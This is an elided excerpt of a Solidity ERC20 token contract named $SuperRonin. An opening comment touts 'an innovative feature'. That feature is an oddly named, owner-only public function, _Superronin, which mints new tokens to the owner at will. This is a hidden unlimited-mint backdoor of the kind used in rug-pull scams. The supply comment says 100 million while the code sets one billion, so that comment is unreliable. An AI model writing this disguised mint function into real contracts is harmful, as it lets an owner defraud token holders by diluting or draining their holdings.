...
//
// $SuperRonin proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Superronin(uint256 amount) public onlyOwner {
 _Superronin(msg.sender, amount);
    }
    ...
    function _Superronin(address account, uint256 amount) internal virtual {
...
contract $SuperRonin is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Super Ronin", "SUPERRONIN") {
     _Superronin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}